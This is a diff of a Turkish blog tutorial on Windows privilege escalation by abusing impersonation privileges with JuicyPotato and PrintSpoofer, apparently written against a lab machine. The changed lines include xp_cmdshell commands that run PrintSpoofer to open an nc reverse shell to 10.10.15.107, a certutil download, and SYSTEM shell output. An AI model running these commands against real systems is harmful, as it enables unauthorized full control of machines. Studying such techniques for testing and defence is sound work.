@@ -205,7 +205,7 @@ NULL
 NULL        
 ```
 
-İşlem başarıyla tamamlandığında nc dinleyicimize NT AUTHORITY\SYSTEM shell'i gelecektir:
+İşlem başarıyla tamamlandığında **nc** dinleyicimize `NT AUTHORITY\SYSTEM` shell'i gelecektir:
 
 ```bash
 Listening on 0.0.0.0 8181
@@ -220,13 +220,14 @@ nt authority\system
 C:\Windows\system32>
 ```
 
+<br>
 
 ## **PrintSpoofer ve RoguePotato**
 
 **JuicyPotato**, Windows Server 2019 ve Windows 10 build 1809 ve sonrasında çalışmamaktadır. Ancak <a href="https://github.com/itm4n/PrintSpoofer" target="_blank" rel="noopener noreferrer">PrintSpoofer</a> ve <a href="https://github.com/antonioCoco/RoguePotato" target="_blank" rel="noopener noreferrer">RoguePotato</a> aynı ayrıcalıkları kullanarak `NT AUTHORITY\SYSTEM` seviyesine erişim sağlayabilir. JuicyPotato'nun artık çalışmadığı Windows 10 ve Server 2019 üzerinde impersonation ayrıcalıklarını kötüye kullanmak için PrintSpoofer aracına dair daha kapsamlı bilgiye <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/" target="_blank" rel="noopener noreferrer">bu blog yazısından</a> ulaşabilirsiniz.
 
 
-### PrintSpoofer
+### **PrintSpoofer**
 
 PrintSpoofer aracını hızlıca denemek istersek, exploit kısmına kadar diğer adımları olduğu gibi yapıp aşağıdaki gibi devam edebiliriz.
 
@@ -239,7 +240,7 @@ SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell "certutil.exe -urlcache -f h
 ```
 
 ```bash
-xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.15.107 8181 -e cmd"
+xp_cmdshell C:\Users\Public\PrintSpoofer.exe -c "C:\Users\Public\nc.exe 10.10.15.107 8181 -e cmd"
 ```
 
 ```bash
@@ -263,13 +264,14 @@ whoami
 nt authority\system
 ```
 
+<br>
 
-## Son Söz
+## **Son Söz**
 
 **SeImpersonate** ve **SeAssignPrimaryToken** ayrıcalıklarını kötüye kullanarak yetki yükseltmek son derece yaygın bir saldırı vektörüdür. Hedef sistemin işletim sistemi sürümüne ve build numarasına göre kullanılabilecek araçların değiştiğini bilmek ve bunlara hâkim olmak kritik öneme sahiptir.
 
 
-## Referanslar
+## **Referanslar**
 
 - <a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noopener noreferrer">JuicyPotato</a>
 - <a href="https://github.com/itm4n/PrintSpoofer" target="_blank" rel="noopener noreferrer">PrintSpoofer</a>
